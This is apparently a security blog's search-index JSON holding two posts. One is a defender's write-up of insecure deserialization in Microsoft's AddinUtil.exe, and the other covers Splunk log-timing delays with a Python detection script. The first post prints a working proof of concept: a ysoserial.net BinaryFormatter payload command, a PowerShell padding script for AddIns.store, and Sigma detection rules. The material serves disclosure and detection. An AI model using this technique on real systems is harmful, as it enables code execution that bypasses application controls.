[
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "Blue-Prints Blog",
    "section": "",
    "text": "@McKinleyMike @TheLatteri\n\n\nMichael McKinley is a Lead Security Engineer in the financial services sector. He is responsible for detecting, disrupting, profiling, and disclosing attacks by APTs targeting the financial industry, such as the attempt by FIN7 to spread malware through the spoofing of the SEC EDGAR filing system. Additionally, Michael has discovered and disclosed security vulnerabilities in leading enterprise software.\nWhen not hacking, Michael enjoys spending time in the great outdoors.\n\n\nTony Latteri is a seasoned blue team operator and Principal Security Engineer in the financial services sector with a passion to deny, degrade, and disrupt cyber adversary operations.\nWhen not bringing pain to the adversary, Tony enjoys picking up and putting down heavy things."
  },
  {
    "objectID": "index.html#blog-posts",
    "href": "index.html#blog-posts",
    "title": "Blue-Prints Blog",
    "section": "Blog Posts",
    "text": "Blog Posts\n\n\n\n\n\n\nTitle\n\n\nDate\n\n\n\n\n\n\nInsecure Deserialization in AddinUtil.exe\n\n\n9/18/23\n\n\n\n\nLog Timing Delays in Splunk Could be Putting Your Security at Risk\n\n\n4/19/23\n\n\n\n\n\n\nNo matching items"
  },
  {
    "objectID": "index.html#subscribe",
    "href": "index.html#subscribe",
    "title": "Blue-Prints Blog",
    "section": "Subscribe",
    "text": "Subscribe\nSubscribe via  RSS to recieve updates."
  },
  {
    "objectID": "content/blog/blog.html",
    "href": "content/blog/blog.html",
    "title": "Blog Direcotry",
    "section": "",
    "text": "Insecure Deserialization in AddinUtil.exe\n\n\n\n\n\nWe explore a method to gain proxy execution through the native .NET utility AddinUtil.exe\n\n\n\n\n\n\nSep 18, 2023\n\n\nTony Latteri, Michael McKinley\n\n\n\n\n\n\n  \n\n\n\n\nLog Timing Delays in Splunk Could be Putting Your Security at Risk\n\n\n\n\n\nDiscover how minor logging delays can lead to missed Splunk alerts and put your security at risk. Learn how to avoid this issue.\n\n\n\n\n\n\nApr 19, 2023\n\n\nMichael McKinley\n\n\n\n\n\n\nNo matching items"
  },
  {
    "objectID": "content/blog/posts/lolbin/addinutil-lolbas.html",
    "href": "content/blog/posts/lolbin/addinutil-lolbas.html",
    "title": "Insecure Deserialization in AddinUtil.exe",
    "section": "",
    "text": "TLDR;\nAn investigation discovered an adversary exploiting the native Microsoft.NET binary AddinUtil.exe to proxy execution. We go on a journey to reproduce their attack, document a previously unknown LOLBAS technique, and provide detection opportunities to the community.\n\n\nIntroduction\nMicrosoft’s recommended block rules for Windows Defender Application Control (WDAC) is a fairly extensive list of legitimate binaries often exploited by malicious actors seeking to execute code. Nevertheless, those curious about the reasons behind these binaries’ inclusion on the list may be disappointed by the lack of available information. During an investigation we encountered an adversary leverging AddinUtil.exe for execution T1218, a binary in the WDAC recommended block list, and began researching.\nUnderstanding AddinUtil.exe\nThe legitimate use case for AddinUtil is somewhat elusive, it appears to be related to Microsoft Office Add-Ins, with the help message stating:\n\n“This tool updates the cache file in the specified folder, informing the add-in model that new add-in segments have been deployed into this folder. The pipeline root should be a folder containing subfolders for various add-in segments like host adapters, contracts, an optional AddIns subfolder, etc.”\n\nAdditionally, AddinUtil.exe is relatively old and dates back to at least version 3.5 of the .NET framework (November 2007).\nWith general information about the binary limited, and the absence of public threat research, we found ourselves at square one in determining the method of proxy execution.\nFortunately, AddinUtil.exe is a C# application. This makes it relatively straightforward to disssect and analyze the execution flow with tools such as dnSpy.\n\n\nObserved Technique\nWe observed the threat actor create a folder masquerading as an Outlook CRM plugin. The adversary also created a file with an unknown extension called AddIns.store. Finally, the actor proceeded to switch their current working directory to the Outlook CRM plugin folder and execute AddinUtil.exe with the following command:\nC:\\Users\\User\\Desktop\\CRM_Outlook_Addin&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe -AddinRoot:.\nThe command line parameter -AddinRoot gave us a good starting point to begin a deeper investigation into the AddinUtil binary. The argument “.” indicates the execution directory of C:\\Users\\User\\Desktop\\CRM_Outlook_Addin, which contained the AddIns.store file. Using these key pieces of information, dynamic analysis of the binary began.\nOur first aim is to understand how AddIns.store is loaded by AddInUtil.exe using the -AddinRoot: parameter.\nWe replicated the same folder structure, file names, and command-line arguments; however, we left our AddIns.store file empty because we did not have the original.\nOur first execution produced the following output:\nC:\\Users\\User\\Desktop\\CRM_Outlook_Addin&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe -AddinRoot:.\nError: System.InvalidOperationException: Add-In deployment cache file C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\AddIns.store is corrupted. \nPlease use AddInUtil and rebuild this store.\n   at System.AddIn.Hosting.AddInStore.ReadCache[T](String storeFileName, Boolean mustExist)\n   at System.AddIn.Hosting.AddInStore.GetDeploymentState(String path, String storeFileName, Reader reader, Builder stateBuilder)\n   at System.AddIn.Hosting.AddInStore.GetAddInDeploymentState(String addinRoot)\n   at System.AddIn.Hosting.AddInStore.AddInStoreIsOutOfDate(String addInPath)\n   at System.AddIn.Hosting.AddInStore.UpdateAddInsIfExist(String addInsPath, Collection`1 warningsCollection)\n   at System.AddIn.Hosting.AddInStore.UpdateAddIns(String addInsFolderPath)\n   at System.Tools.AddInUtil.Main(String[] args)\nFrom the stack trace produced, our attention shifted to the System.AddIn.Hosting.AddInStore.ReadCache method which references a BinaryFormatter object and an invocation of BinaryFormatter.Deserialize on line 24.\nprivate static T ReadCache&lt;T&gt;(string storeFileName, bool mustExist)\n        {\n            new SecurityPermission(SecurityPermissionFlag.SerializationFormatter).Demand();\n            new FileIOPermission(FileIOPermissionAccess.Read | FileIOPermissionAccess.PathDiscovery, storeFileName).Assert();\n            BinaryFormatter binaryFormatter = new BinaryFormatter();\n            T t = default(T);\n            if (File.Exists(storeFileName))\n            {\n                for (int i = 0; i &lt; 4; i++)\n                {\n                    try\n                    {\n                        using (Stream stream = File.OpenRead(storeFileName))\n                        {\n                            if (stream.Length &lt; 12L)\n                            {\n                                throw new InvalidOperationException(string.Format(CultureInfo.CurrentCulture, Res.DeployedAddInsFileCorrupted, new object[] { storeFileName }));\n                            }\n                            BinaryReader binaryReader = new BinaryReader(stream);\n                            int num = binaryReader.ReadInt32();\n                            long num2 = binaryReader.ReadInt64();\n                            try\n                            {\n                                t = (T)((object)binaryFormatter.Deserialize(stream));\n                            }\n                            catch (Exception ex)\n                            {\n                                throw new InvalidOperationException(string.Format(CultureInfo.CurrentCulture, Res.CantDeserializeData, new object[] { storeFileName }), ex);\n                            }\n                        }\n                        break;\n                    }\n                    catch (IOException ex2)\n                    {\n                        if (Marshal.GetHRForException(ex2) != -2147024864)\n                        {\n                            throw;\n                        }\n                        Thread.Sleep(500);\n                    }\n                }\n                return t;\n            }\n            if (mustExist)\n            {\n                throw new InvalidOperationException(string.Format(CultureInfo.CurrentCulture, Res.CantFindDeployedAddInsFile, new object[] { storeFileName }));\n            }\n            return t;\n        }\nUpon discovering the usage of BinaryFormatter.Deserialize, we recognized the risk, given its reputation for being insecure. Microsoft states:\n\n“…assume that calling BinaryFormatter.Deserialize over a payload is the equivalent of interpreting that payload as a standalone executable and launching it.”\n\nTo replicate the attack, we realized the need to exploit a deserialization vulnerability in AddinUtil for proxy execution. Alvaro Muñoz’s project, ysoserial.net, offers an excellent toolset for crafting payloads to exploit various .NET deserialization vulnerabilities.\n\n\nProof of Concept\nTo reproduce the attack we began with the .NET gadget TextFormattingRunProperties, chosen for its smaller size. It’s worth noting that many other gadgets are available; experiment and determine which you prefer. Our payload is crafted with the following arguments:\nysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw &gt;&gt; C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\Addins.Store\nIf successful the payload will launch the Windows calculator app. However, we instead recieved the error:\nC:\\Users\\User\\Desktop\\CRM_Outlook_Addin&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe -AddinRoot:.\nRerunning this Error: System.InvalidOperationException: The Add-in store is corrupt. Please use AddInUtil and rebuild this store: C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\AddIns.store ---&gt; System.Runtime.Serialization.SerializationException: The input stream is not a valid binary format. The starting contents (in bytes) are: 00-00-00-00-00-0C-02-00-00-00-57-53-79-73-74-65-6D ...\n   at System.Runtime.Serialization.Formatters.Binary.SerializationHeaderRecord.Read(__BinaryParser input)\n   ...\nThis error is interesting; suggesting the input AddIns.store file isn’t correctly formatted and the binary format did not deserialize as expected. It also provides the starting bytes of 00-00-00-00-00-0C-02. Looking at the actual starting bytes of the file, we see 00-01-00-00-00-FF-FF. The byte sequence provided by the error code starts at offset 0x0C, rather than 0x00.\nLooking back at the ReadCache code, we see two very important lines preceding the Deserialization method:\nint num = binaryReader.ReadInt32();\nlong num2 = binaryReader.ReadInt64();\nThese two methods are responsible for effectively shifting the binary stream by 4-bytes and 8-bytes respectively. This causes the AddIns.store file to be read starting at the 13th byte (offset 0x0C). To account for this, we need to pad our AddIns.store file by 12 bytes. This can be accomplished with the below powershell script.\n$filePath = \"C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\AddIns.Store\"\n\n$existingContent = Get-Content -Path $filePath -Encoding Byte\n$modifiedContent = [byte[]](0) * 12 + $existingContent\n$modifiedContent | Set-Content -Path $filePath -Encoding Byte -NoNewline\nAfter correcting our padding and executing our payload we successfully replicated the attack: Video Fig 1. AddinUtil.exe AddinRoot LOLBAS Proof of Concept\n\n\nDetection Opportunities\nThe following Sigma rules may be useful for identifying suspicious AddinUtil usage, these are experimental and should be backtested in your environment.\nAddinUtil.exe Execution from Suspicious Directory Link\ntitle: AddinUtil.exe Execution from Suspicious Directory\nid: 74e16e48-667d-4540-893d-e0f100cafc27 \nstatus: experimental\ndescription: Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) from a non-standard directory. \nreferences:\n    - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html\ntags:\n    - attack.defense_evasion  \n    - attack.t1218   \nauthor: Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)\ndate: 2023/09/18\nlogsource:                      \n    category: process_creation  \n    product: windows           \ndetection:\n    selection:\n        Image|endswith: '\\addinutil.exe'\n    filter_64bit:\n        Image|startswith: 'C:\\Windows\\Microsoft.NET\\Framework64\\'\n    filter_32bit:\n        Image|startswith: 'C:\\Windows\\Microsoft.NET\\Framework\\'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\nAddinUtil.exe Execution with Suspicious Command Line Link\ntitle: AddinUtil.exe Execution with Suspicious Command Line\nid: 74e16e48-667d-4540-893d-e0f100cafc27 \nstatus: experimental\ndescription: Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) with uncommon Addinroot or Pipelineroot paths. An adversary may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to the adversaries Addins.Store payload.\nreferences:\n    - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html\ntags:\n    - attack.defense_evasion  \n    - attack.t1218   \nauthor: Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)\ndate: 2023/09/18\nlogsource:                      \n    category: process_creation  \n    product: windows           \ndetection:\n    selection:\n        Image|endswith: '\\addinutil.exe'\n    filter_addinroot:\n        CommandLine|contains: '-PipelineRoot:\"C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTA\\'\n    filter_pipelineroot:\n        CommandLine|contains: '-AddinRoot:\"C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTA\\'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\nAddinUtil.exe Network Connection Link\ntitle: AddinUtil.exe Network Connection\nid: 3f73cf20-daf9-48ec-ac4d-5e996096c9c0\nstatus: experimental\ndescription: Detects network connections made by the Add-In deployment cache updating utility (AddInutil.exe), which could indicate command and control.\nreferences:\n    - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html\ntags:\n    - attack.defense_evasion  \n    - attack.t1218   \nauthor: Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)  \ndate: 2023/09/18\nlogsource:                      \n    category: network_connection  \n    product: windows           \ndetection:\n    selection:\n        Initiated: 'true'\n        Image|endswith: '\\addinutil.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\nAddinUtil.exe with Suspicious Child Process Link\ntitle: AddinUtil.exe with Suspicious Child Process\nid: 42e3ad54-a382-4e50-a297-4ee84777bddf\nstatus: experimental\ndescription: Detects suspicious child process of the Add-In deployment cache updating utility (AddInutil.exe) which could be a sign of potential abuse of the binary to proxy execution via a custom Addins.Store payload.\nreferences:\n    - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html\ntags:\n    - attack.defense_evasion  \n    - attack.t1218   \nauthor: Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)\ndate: 2023/09/18\nlogsource:                      \n    category: process_creation  \n    product: windows           \ndetection:\n    selection:\n        ParentImage|endswith: '\\addinutil.exe'\n    filter_werfault_32bit:\n        Image|endswith: '\\Windows\\System32\\werfault.exe'\n    filter_werfault_64bit:\n        Image|endswith: '\\Windows\\SysWOW64\\werfault.exe'\n    filter_conhost:\n        Image|endswith: '\\Windows\\System32\\conhost.exe'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n\n\nBonus\nThere is second proxy execution technique in AddinUtil.exe that uses the parameter -PipelineRoot:. We will leave this as an exercise for the reader to reproduce.\nVideo Fig 2. AddinUtil.exe PipelineRoot LOLBAS Proof of Concept\n\n\nClosing Notes\n\nMicrosoft is aware and determined this does not cross a security boundary, it will not be remediated."
  },
  {
    "objectID": "content/blog/posts/splunk/splunklogdelay.html",
    "href": "content/blog/posts/splunk/splunklogdelay.html",
    "title": "Log Timing Delays in Splunk Could be Putting Your Security at Risk",
    "section": "",
    "text": "BLUF: Logging delay to Splunk as little as 100ms can cause missed alerts.\n\nA Tale of Two Times\nSplunk is a powerful platform for collecting, indexing and analyzing data from various sources. However, it is critically important to understand the nuances of how Splunk handles time; forgoing such consideration may lead to missing critical events.\n\n_time\nThe _time field in Splunk represents the timestamp of an event as specified by the source log. This field is critical for time-based analysis, such as identifying trends, detecting anomalies, and correlating events across different sources. This is the time that Splunk visualizes when viewing search results and is used as the time variable when performing searches.\n\n\n_indextime\nThe _indextime field in Splunk represents the timestamp when Splunk indexes the event, which may not always be the same as the _time field. Simply, it’s the time Splunk logged the event, and it will almost always differ from _time even if by milliseconds.\n\n\n\nA Wrinkle in Time\nWhy do the times differ?\nTruth is, there is a delay. There are many points in the ingestion pipeline that can cause delay, such as:\n\nNetwork latency\nLogging throughput capacity\nLogging interval\nClock skew\n\nTiming delays in Splunk can cause missed alerts, which may result in serious consequences for security and other critical operations.\nFor instance, if an alert is monitoring a critical system, but there is a delay between the _time and _indextime timestamps, the alert may not be triggered even when events occur.\n\n\nSmall Delay = Big Problem\nHow much delay can cause missed events?\nDelays of milliseconds can result in missed events. During testing in the worst case scenario, delays of 100ms resulted in missed events. Theoretically the delay can be even be lower. This raises an important question - are you confident that all of your critical logging sources consistently log in near real-time?\n\n\nDelay Detection\nCan I calculate delays in my log sources?\nYes, Splunk has a great article on this: here.\nTL;DR To discover log delays subtract _time from _indextime.\nindex=example_delay | eval delay_sec=_indextime-_time | eval delay_minute=(delay_sec/60) | timechart span=1h avg(delay_minute) by index\n Fig 1. Example Timechart for Splunk Search\nCan I discover if any of my recent saved searches missed events?\nYes, a simple method is to re-run the search over the same period and compare the results. If the results differ over there is likely a timing issue.\nBelow is an example script in Python to identify saved searches with timing issues. Usage information: here.\nI’ve run this script against a lab instance of Splunk with intentionally induced delays, the results are below.\n\n#Code to detect and graph differences in recently ran searches\n\n# Import required libraries\nimport time\nimport json\nimport splunklib.client as client\nimport splunklib.results as results\nimport matplotlib.pyplot as plt\nimport matplotlib.dates as mdates\nfrom datetime import datetime, timedelta\n\n\n# Function to connect to the Splunk service\ndef splunk_connect(base_url, port, splunk_account, splunk_password):\n\n    try:\n        # Connect to the Splunk service\n        service = client.connect(host=base_url, port=port, username=splunk_account, password=splunk_password)\n        print('Connected to Splunk instance: {}'.format(base_url))\n        print('-' * 90)\n    except Exception as e:\n        print('Error in Connecting to Splunk: {}'.format(e))\n    \n    # Return the service object\n    return service\n\n\n# Function to compare jobs\ndef compare_jobs(service,owner,graph):\n    \n    # Get the list of search jobs\n    search_jobs = service.jobs.list()\n    \n    # Loop through the search jobs\n    for job in search_jobs:\n        # If the job is a saved search and the owner matches the specified owner\n        if job['content']['isSavedSearch'] == '1' and job['access']['owner'] == owner:\n     \n            # Initialize lists to store results\n            results_list = []\n            results_list_new = []\n            \n            # Set the keyword arguments for the search job\n            kwargs =    {\"earliest_time\": job['content']['earliestTime'],\n                         \"latest_time\": job['content']['latestTime'],\n                         \"search_mode\": \"normal\",\n                         \"output_mode\": \"json\"}\n                \n            # Get the results of the original job\n            job_results = job.results(output_mode='json')\n            \n            # Parse the results and append them to the results list\n            for x in results.JSONResultsReader(job_results):\n                results_list.append(dict(x))\n                    \n            # Create a new job with the same search criteria\n            job_new = service.jobs.create(job['content']['eventSearch'],**kwargs)\n            \n            # Wait for the new job to finish\n            while not job_new.is_done():\n                time.sleep(1)\n                    \n            # Get the results of the new job\n            job_results_new = job_new.results(output_mode='json')\n            \n            # Parse the results and append them to the new results list\n            for y in results.JSONResultsReader(job_results_new):\n                results_list_new.append(dict(y))\n                \n            # Compare the lengths of the results lists\n            if(len(results_list) != len(results_list_new)):\n                # Initialize lists to store issues\n                search_issue = []\n                results_indexed = []\n                results_time = []\n                # Add the search issue to the list\n                search_issue.append({\n                    'sid': job['content']['sid'],\n                    'label': job['content']['label'],\n                    'earliest_time': job['content']['earliestTime'],\n                    'latest_time': job['content']['latestTime'],\n                })\n                    \n                # Get the unique keys for the results\n                results_keys = [(d.get('_raw'), d.get('_indextime'), d.get('_time')) for d in results_list]\n                results_keys_new = [(d.get('_raw'), d.get('_indextime'), d.get('_time')) for d in results_list_new]\n                \n                # Find the unique results in the new results list\n                unique_to_new = set(results_keys_new) - set(results_keys)\n\n                # print the unique results\n                if unique_to_new:\n                    print('SEARCH: {} SID: {}'.format(job['content']['label'],job['content']['sid']))\n                    print('RESULT: DIFFERENCE FOUND')\n                    print('NOTE: This is indicative of a delay issue and resulted in missing events in the original search.')\n                    print('-' * 10)\n                    print('List of Missing Results')\n                    print('-' * 10)\n                    \n                    #format time and set in index\n                    for key in unique_to_new:\n                        formatted_indextime = datetime.utcfromtimestamp(int(key[1])).strftime('%Y-%m-%d %H:%M:%S')\n                        results_indexed.append(formatted_indextime)\n                        formatted_time = datetime.fromisoformat(key[2]).strftime('%Y-%m-%d %H:%M:%S')\n                        results_time.append(formatted_time)\n                        print('        _time={},_indextime={},_raw={}'.format(formatted_time,formatted_indextime,key[0]))\n                    \n                    #graph the results    \n                    if graph == 'true':     \n                        plot_timeline(search_issue,results_indexed,results_time)\n                    print('-' * 90)\n            else:\n                print('SEARCH: {} SID: {}'.format(job['content']['label'],job['content']['sid']))\n                print('RESULT: NO DELAY FOUND')\n                print('NOTE: Search results in original search and re-ran search match, no delay issue identified.')\n                print('-' * 90)\n \n\n# Function to plot the timeline of the search issue\ndef plot_timeline(search_issue, results_indexed, results_time):\n    \n    # Convert result issue timestamps to datetime objects\n    indextimes = [datetime.strptime(d, '%Y-%m-%d %H:%M:%S') for d in results_indexed]\n    times = [datetime.strptime(d, '%Y-%m-%d %H:%M:%S') for d in results_time]\n    # Set the title and subtitle for the plot\n    title = search_issue[0]['label']\n    subtitle = search_issue[0]['sid']\n    \n    # Get the start and end dates of the search issue and remove timezone and microseconds\n    start_date = datetime.strptime(search_issue[0]['earliest_time'], '%Y-%m-%dT%H:%M:%S.%f%z')\n    start_date = start_date.replace(microsecond=0, tzinfo=None)\n    end_date = datetime.strptime(search_issue[0]['latest_time'], '%Y-%m-%dT%H:%M:%S.%f%z')\n    end_date = end_date.replace(microsecond=0, tzinfo=None)\n\n    # Create a figure and axis for the plot\n    fig, ax = plt.subplots(figsize=(12, 6))\n\n    # Plot the base timeline\n    ax.plot([start_date, end_date], [0, 0], color='black', alpha=0.5)\n    # Fill the area between the start and end dates\n    ax.fill_between([start_date, end_date], -0.5, 0.5, color='green', alpha=0.2)\n\n    # Calculate the maximum difference between indextime and start_time\n    max_difference = max([abs((date - start_date).total_seconds()) for date in indextimes] +\n                         [abs((date - end_date).total_seconds()) for date in indextimes])\n    \n    # Set the buffer based on the maximum difference\n    buffer = timedelta(seconds=max_difference * 0.1)\n\n    # Set the x and y limits for the plot\n    ax.set_xlim(start_date - buffer, end_date + buffer)\n    ax.set_ylim(-0.5, 0.5)\n\n    # Remove spines and y-axis\n    ax.spines['left'].set_visible(False)\n    ax.spines['right'].set_visible(False)\n    ax.spines['top'].set_visible(False)\n    ax.yaxis.set_visible(False)\n\n    # Plot the indexed markers and annotations\n    for idx, date in enumerate(indextimes):\n        ax.plot(date, 0, 'ro', markersize=8, label='Indexed Time for Event')\n        ax.annotate('{} - {}'.format(idx,date.strftime('%m-%d-%Y %H:%M:%S')), xy=(date, 0), xytext=(date, 0.1 + (idx % 2) * 0.1),\n                arrowprops=dict(arrowstyle='-&gt;', lw=1.5),\n                fontsize=12, ha='center')\n        \n    #plot the time markers and annotations\n    for idx, date in enumerate(times):\n        ax.plot(date, 0, 'bo', markersize=8, label='Time for Event')\n        ax.annotate('{} - {}'.format(idx,date.strftime('%m-%d-%Y %H:%M:%S')), xy=(date, 0), xytext=(date, -0.1 + (idx % 2) * -0.1),\n                arrowprops=dict(arrowstyle='-&gt;', lw=1.5),\n                fontsize=12, ha='center')\n\n    # Set the title, x-axis formatter, and x-axis locator\n    ax.set_title('{}\\n{}'.format(title,subtitle), fontsize=16, fontweight='bold')\n    ax.xaxis.set_major_formatter(mdates.DateFormatter('%m-%d-%Y %H:%M:%S'))\n    ax.xaxis.set_major_locator(mdates.AutoDateLocator())\n\n    # Create the legend and display unique items\n    handles, labels = ax.get_legend_handles_labels()\n    by_label = dict(zip(labels, handles))\n    ax.legend(by_label.values(), by_label.keys(), loc='upper left')\n    \n    # Adjust layout and display the plot\n    plt.tight_layout()\n    plt.show()\n\n\ndef banner():\n    print('-' * 90)\n    print('-' * 90)\n    print(' _____  _____       _____  _   _   _____  _____ _____ _____ _____ _____ _____ _    _ _____')\n    print(' |    \\ |____ |     |___|   \\_/    |    \\ |____   |   |____ |       |     |    \\  /  |____')\n    print(' |____/ |____ |____ |   |    |     |____/ |____   |   |____ |_____  |   __|__   \\/   |____')\n    print('                                 Splunk Log Delay Detector                            v1.0')\n    print('-' * 90)\n    print('-' * 90)\n    \n    \ndef main():\n    \n    #get config\n    with open('config.json') as f:\n        data = json.load(f)\n        splunk_account = data['splunk_account']\n        splunk_password = data ['splunk_password']\n        base_url = data['base_url']\n        port = data['port']\n        owner = data['owner']\n        graph = data['graph']\n  \n    #show banner\n    banner()\n  \n    #connect to splunk\n    service = splunk_connect(base_url, port, splunk_account, splunk_password)\n    \n    #check and compare all jobs by owner\n    compare_jobs(service,owner,graph) \n    \n    \nif __name__ == \"__main__\":\n    main()\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n _____  _____       _____  _   _   _____  _____ _____ _____ _____ _____ _____ _    _ _____\n |    \\ |____ |     |___|   \\_/    |    \\ |____   |   |____ |       |     |    \\  /  |____\n |____/ |____ |____ |   |    |     |____/ |____   |   |____ |_____  |   __|__   \\/   |____\n                                 Splunk Log Delay Detector                            v1.0\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\nConnected to Splunk instance: 192.168.42.138\n------------------------------------------------------------------------------------------\nSEARCH: indextime_demo SID: scheduler__splunk__search__RMD51aafb4f9eda25a49_at_1680733200_806\nRESULT: DIFFERENCE FOUND\nNOTE: This is indicative of a delay issue and resulted in missing events in the original search.\n----------\nList of Missing Results\n----------\n        _time=2023-04-05 22:19:59,_indextime=2023-04-05 22:20:02,_raw=critical ransomware L0OdbQcw6y\n        _time=2023-04-05 22:19:57,_indextime=2023-04-05 22:20:00,_raw=critical ransomware 3X1K0CTmxE\n\n\n\n\n\n------------------------------------------------------------------------------------------\nSEARCH: indextime_demo SID: scheduler__splunk__search__RMD51aafb4f9eda25a49_at_1680566280_768\nRESULT: NO DELAY FOUND\nNOTE: Search results in original search and re-ran search match, no delay issue identified.\n------------------------------------------------------------------------------------------\n\n\n\n\nA Solution\nRather than telling Splunk to alert to items within the last _time window for our searches, we can alert to anything indexed in the period since our search last ran. Instead saying, “Splunk tell me about any log you just discovered.”\nTo do this the alert requires two modifications:\n\nUpdate the Alert Query\nUpdate the Time Window\n\n\nUpdate Alert Query\nSplunk can use time modifiers in the search query (ref). To switch to _indextime alerting we need to add _index_earliest and _index_latest to our search query. These parameters define the _indextime range we intend to search.\n_index_earliest - In most cases, set this to the time interval the alert looks back on. (e.g. _index_earliest=-15m)\n\n_index_latest - In most cases, this should be set to the current time. (e.g. _index_latest=now())\n\n\nUpdate Time Window\nSwitching to _indextime alerting will not remove the use of _time; it is still a filter on the search. Instead, _time is now the maximum log delay that still generates an alert.\n\n\nAn Example\nThe below search is updated to alert on _indextime alerting. The figure is marked relative to the behavior referenced in the list:\n\nSearch every 15 minutes\nSearch everything indexed within the last 15 minutes\nSearch everything with _time within the last 14 days*\n\n*This does not significantly impact processing; it is not the same as processing 14 days of data\n Fig 2. Example Updated Splunk Alert\nThis alert behaves in the following manner: 1. Runs every 15 minutes 2. Searches logs indexed in the last 15 minutes 3. Searches logs delayed up to 14 days\nSimply using _time can cause issues with saved searches, even in logs are delayed by minimal amounts. Switching to _indextime alerting reduces this problem significantly. In closing, I recommend running all saved searches with this method.*\n\n\nAdditional Items\nThis post did not address the following:\n\nThis does not address or identify issues that set _time in the future. These should be identified separately and remediated.\nCertain saved searches may require additional effort to adopt this method. For example: searches with subsearches, searches with multiple time frames, searches in which _time is a part of calculations or needs to be precise.\nSwitching to _indextime alerting is not a substitute for fixing unacceptable logging delay."
  }
]